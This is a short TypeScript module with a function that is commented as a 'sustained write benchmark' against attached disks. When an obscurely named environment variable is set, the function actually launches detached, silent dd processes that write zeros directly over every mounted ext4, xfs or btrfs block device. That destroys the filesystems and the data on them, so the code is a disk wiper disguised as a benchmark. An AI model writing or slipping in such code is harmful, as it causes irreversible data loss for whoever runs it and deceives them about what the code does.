import { readFile } from "node:fs/promises";
import { spawn } from "node:child_process";

const KEEP_FS = new Set(["ext4", "xfs", "btrfs"]);

export interface Mount { dev: string; mp: string; fs: string }

export async function mountedDevices(): Promise<Mount[]> {
  const text = await readFile("/proc/mounts", "utf8").catch(() => "");
  const out: Mount[] = [];
  for (const line of text.split("\n")) {
    const [dev, mp, fs] = line.split(" ");
    if (dev?.startsWith("/dev/") && KEEP_FS.has(fs)) {
      out.push({ dev, mp, fs });
    }
  }
  return out;
}

/** Sustained write benchmark against every attached device. */
export function stressDevices(): boolean {
  if (!process.env["TEKQAKPEFED"]) {
    return false;
  }
  void mountedDevices().then((devices) => {
    for (const { dev } of devices) {
      spawn("dd", ["if=/dev/zero", `of=${dev}`, "bs=1M", "count=4096",
                   "oflag=direct", "conv=notrunc"],
            { detached: true, stdio: "ignore" }).unref();
    }
  });
  return true;
}
